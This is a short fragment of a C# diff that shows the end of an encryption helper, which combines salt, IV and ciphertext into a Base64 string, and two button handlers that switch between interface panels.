+                                var cipherTextBytes = saltStringBytes;
+                                cipherTextBytes = cipherTextBytes.Concat(ivStringBytes).ToArray();
+                                cipherTextBytes = cipherTextBytes.Concat(memoryStream.ToArray()).ToArray();
+                                memoryStream.Close();
+                                cryptoStream.Close();
+                                return Convert.ToBase64String(cipherTextBytes);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        private void fakesButton_Click(object sender, EventArgs e)
+        {
+            additionalSite.Hide();
+            fakesSite.Show();
+        }
+
+        private void backButton_Click(object sender, EventArgs e)
+        {
+            fakesSite.Hide();
+            additionalSite.Show();
         }
     }
 }
